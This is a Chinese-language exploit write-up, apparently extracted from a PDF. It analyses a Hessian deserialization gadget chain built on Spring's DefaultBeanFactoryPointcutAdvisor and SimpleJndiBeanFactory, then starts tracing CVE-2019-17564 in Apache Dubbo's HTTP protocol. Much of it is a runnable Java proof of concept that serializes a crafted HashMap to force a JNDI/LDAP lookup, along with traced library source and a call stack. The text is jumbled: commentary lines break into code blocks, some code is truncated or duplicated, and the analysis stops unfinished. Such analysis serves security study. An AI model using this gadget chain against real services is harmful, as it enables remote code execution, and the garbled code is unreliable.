和前面差不多，再次不多做分析
利用分析
poc
public static Object makeBeanFactoryTriggerBFPA ( UtilFactory uf, String name, 
BeanFactory bf ) throws Exception {
    DefaultBeanFactoryPointcutAdvisor pcadv = new 
DefaultBeanFactoryPointcutAdvisor();
    pcadv.setBeanFactory(bf);
    pcadv.setAdviceBeanName(name);
    return uf.makeEqualsTrigger(pcadv, new DefaultBeanFactoryPointcutAdvisor());
}
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import marshalsec.HessianBase;
import marshalsec.util.Reflections;
import org.apache.commons.logging.impl.NoOpLog;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;
public class SpringAbstractBeanFactoryPointcutAdvisortest {
    public static void main(String[] args) throws Exception {
        String jndiUrl = "ldap://localhost:1389/obj";
        SimpleJndiBeanFactory bf = new SimpleJndiBeanFactory();
        bf.setShareableResources(jndiUrl);
        Reflections.setFieldValue(bf, "logger", new NoOpLog());
        Reflections.setFieldValue(bf.getJndiTemplate(), "logger", new 
NoOpLog());
//        bf
        DefaultBeanFactoryPointcutAdvisor pcadv = new 
DefaultBeanFactoryPointcutAdvisor();
        pcadv.setBeanFactory(bf);
        pcadv.setAdviceBeanName(jndiUrl);
        HashMap s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
断点依旧打在 MapDeserializer 中，调用put方法，跟踪
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, 
Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, pcadv, pcadv, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, new 
DefaultBeanFactoryPointcutAdvisor(), new DefaultBeanFactoryPointcutAdvisor(), 
null));
        Reflections.setFieldValue(s, "table", tbl);
        ByteArrayOutputStream byteArrayOutputStream = new 
ByteArrayOutputStream();
        Hessian2Output hessian2Output = new 
Hessian2Output(byteArrayOutputStream);
        HessianBase.NoWriteReplaceSerializerFactory sf = new 
HessianBase.NoWriteReplaceSerializerFactory();
        sf.setAllowNonSerializable(true);
        hessian2Output.setSerializerFactory(sf);
        hessian2Output.writeObject(s);
        hessian2Output.flushBuffer();
        byte[] bytes = byteArrayOutputStream.toByteArray();
        // hessian2反序列化
        ByteArrayInputStream byteArrayInputStream = new 
ByteArrayInputStream(bytes);
        Hessian2Input hessian2Input = new Hessian2Input(byteArrayInputStream);
        HashMap o = (HashMap) hessian2Input.readObject();
//        pcadv, new DefaultBeanFactoryPointcutAdvisor();
    }
}
   public V put(K key, V value) {
        return putVal(hash(key), key, value, false, true);
    }
final V putVal(int hash, K key, V value, boolean onlyIfAbsent,
                   boolean evict) {
        Node[] tab; Node p; int n, i;
        if ((tab = table) == null || (n = tab.length) == 0)
            n = (tab = resize()).length;
        if ((p = tab[i = (n - 1) & hash]) == null)
            tab[i] = newNode(hash, key, value, null);
        else {
            Node e; K k;
            if (p.hash == hash &&
                ((k = p.key) == key || (key != null && key.equals(k))))
这条链是借助调用getbean
public boolean equals(Object other) {
    if (this == other) {
        return true;
    } else if (!(other instanceof PointcutAdvisor)) {
        return false;
    } else {
        PointcutAdvisor otherAdvisor = (PointcutAdvisor)other;
        return ObjectUtils.nullSafeEquals(this.getAdvice(), 
otherAdvisor.getAdvice()) && ObjectUtils.nullSafeEquals(this.getPointcut(), 
otherAdvisor.getPointcut());
    }
}
public Advice getAdvice() {
    Advice advice = this.advice;
    if (advice == null && this.adviceBeanName != null) {
        Assert.state(this.beanFactory != null, "BeanFactory must be set to 
resolve 'adviceBeanName'");
        if (this.beanFactory.isSingleton(this.adviceBeanName)) {
            advice = (Advice)this.beanFactory.getBean(this.adviceBeanName, 
Advice.class);
public  T getBean(String name, Class requiredType) throws BeansException {
    try {
        return this.isSingleton(name) ? this.doGetSingleton(name, requiredType) 
: this.lookup(name, requiredType);
 private  T doGetSingleton(String name, Class requiredType) throws 
NamingException {
        synchronized(this.singletonObjects) {
            Object jndiObject;
            if (this.singletonObjects.containsKey(name)) {
                jndiObject = this.singletonObjects.get(name);
                if (requiredType != null && 
!requiredType.isInstance(jndiObject)) {
                    throw new 
TypeMismatchNamingException(this.convertJndiName(name), requiredType, jndiObject 
!= null ? jndiObject.getClass() : null);
                } else {
                    return jndiObject;
                }
            } else {
                jndiObject = this.lookup(name, requiredType);
                this.singletonObjects.put(name, jndiObject);
                return jndiObject;
            }
        }
    }
 protected  T lookup(String jndiName, Class requiredType) throws 
NamingException {
        Assert.notNull(jndiName, "'jndiName' must not be null");
        String convertedName = this.convertJndiName(jndiName);
        Object jndiObject;
        try {
            jndiObject = this.getJndiTemplate().lookup(convertedName, 
requiredType);
 public  T lookup(String name, Class requiredType) throws NamingException 
{
        Object jndiObject = this.lookup(name);
ublic Object lookup(final String name) throws NamingException {
        if (this.logger.isDebugEnabled()) {
            this.logger.debug("Looking up JNDI object with name [" + name + 
"]");
        }
        return this.execute(new JndiCallback() {
            public Object doInContext(Context ctx) throws NamingException {
                Object located = ctx.lookup(name);
                if (located == null) {
                    throw new NameNotFoundException("JNDI object with [" + name 
+ "] not found: JNDI implementation returned null");
                } else {
调用栈
                    return located;
                }
            }
        });
    }
 public  T execute(JndiCallback contextCallback) throws NamingException {
        Context ctx = this.getContext();
        Object var3;
        try {
            var3 = contextCallback.doInContext(ctx);
        } finally {
            this.releaseContext(ctx);
        }
        return var3;
    }
public Object lookup(final String name) throws NamingException {
        if (this.logger.isDebugEnabled()) {
            this.logger.debug("Looking up JNDI object with name [" + name + 
"]");
        }
        return this.execute(new JndiCallback() {
            public Object doInContext(Context ctx) throws NamingException {
                Object located = ctx.lookup(name);
                if (located == null) {
                    throw new NameNotFoundException("JNDI object with [" + name 
+ "] not found: JNDI implementation returned null");
                } else {
                    return located;
                }
            }
        });
    }
lookup:417, InitialContext (javax.naming)
doInContext:155, JndiTemplate$1 (org.springframework.jndi)
execute:87, JndiTemplate (org.springframework.jndi)
lookup:152, JndiTemplate (org.springframework.jndi)
lookup:179, JndiTemplate (org.springframework.jndi)
lookup:95, JndiLocatorSupport (org.springframework.jndi)
doGetSingleton:218, SimpleJndiBeanFactory (org.springframework.jndi.support)
getBean:112, SimpleJndiBeanFactory (org.springframework.jndi.support)
0x04 漏洞分析
CVE-2019-17564 漏洞分析
影响版本
1. 2.7.0 
跟进 handler.handle(request, response);
来到 org.apache.dubbo.rpc.protocol.http.HttpProtocol#handle
这里是获取url中的类名，然后从 skeletonMap 中取值将对应的 HttpInvokerServiceExporter 对象
protected void service(HttpServletRequest request, HttpServletResponse response) 
throws ServletException, IOException {
        HttpHandler handler = (HttpHandler)handlers.get(request.getLocalPort());
        if (handler == null) {
            response.sendError(404, "Service not found.");
        } else {
            handler.handle(request, response);
        }
    }
 public void handle(HttpServletRequest request, HttpServletResponse response) 
throws IOException, ServletException {
            String uri = request.getRequestURI();
            HttpInvokerServiceExporter skeleton = 
(HttpInvokerServiceExporter)HttpProtocol.this.skeletonMap.get(uri);
            if (!request.getMethod().equalsIgnoreCase("POST")) {
                response.setStatus(500);
            } else {
 RpcContext.getContext().setRemoteAddress(request.getRemoteAddr(), 
request.getRemotePort());
                try {
                    skeleton.handleRequest(request, response);
                } catch (Throwable var6) {
                    throw new ServletException(var6);
                }
            }
跟进 skeleton.handleRequest(request, response);
来到
org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter#handleRequest
跟进 this.readRemoteInvocation(request);
来到
org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter#readRemoteInvoc
ation
public void handleRequest(HttpServletRequest request, HttpServletResponse 
response) throws ServletException, IOException {
    try {
        RemoteInvocation invocation = this.readRemoteInvocation(request);
        RemoteInvocationResult result = this.invokeAndCreateResult(invocation, 
this.getProxy());
        this.writeRemoteInvocationResult(request, response, result);
    } catch (ClassNotFoundException var5) {
        throw new NestedServletException("Class not found during 
deserialization", var5);
    }
}
protected RemoteInvocation readRemoteInvocation(HttpServletRequest request) 
throws IOException, ClassNotFoundException {
    return this.readRemoteInvocation(request, request.getInputStream());
}
org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter#readRemoteInvoc
ation
this.doReadRemoteInvocation(ois);
org.springframework.remoting.rmi.RemoteInvocationSerializingExporter#doReadRemoteIn
vocation
疑惑留存